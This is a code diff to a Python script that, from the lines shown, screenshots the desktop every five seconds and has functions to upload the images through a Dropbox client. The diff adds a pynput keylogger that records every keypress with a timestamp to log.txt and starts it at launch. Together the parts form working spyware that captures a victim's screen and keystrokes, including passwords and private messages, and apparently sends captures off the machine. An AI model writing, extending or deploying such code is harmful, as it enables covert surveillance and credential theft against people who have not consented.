@@ -3,9 +3,12 @@ import dropbox
 from datetime import datetime
 import os
 import threading
+from pynput.keyboard import Key, Listener
+import logging
 
 
 dbx = dropbox.Dropbox('')
+logging.basicConfig(filename=("log.txt"), level=logging.DEBUG, format= '%(asctime)s: %(message)s')
 
 def main():
     threading.Timer(5.0, main).start()
@@ -19,8 +22,16 @@ def grab_desktop_image():
     dt = datetime.now()
     fname = "pic_{}.{}.png".format(dt.strftime("%H%M_%S"), dt.microsecond // 100000)
     im.save(fname, 'png')
-
+    print(fname)
     return fname
+
+def logger():
+
+    def on_press(key):
+        logging.info(key)
+
+    with Listener(on_press=on_press) as listener:
+        listener.join()
 
 
 def remove_image(image):
@@ -40,4 +51,5 @@ def upload_image(file_name):
 
 if __name__ == '__main__':
     main()
+    logger()
 
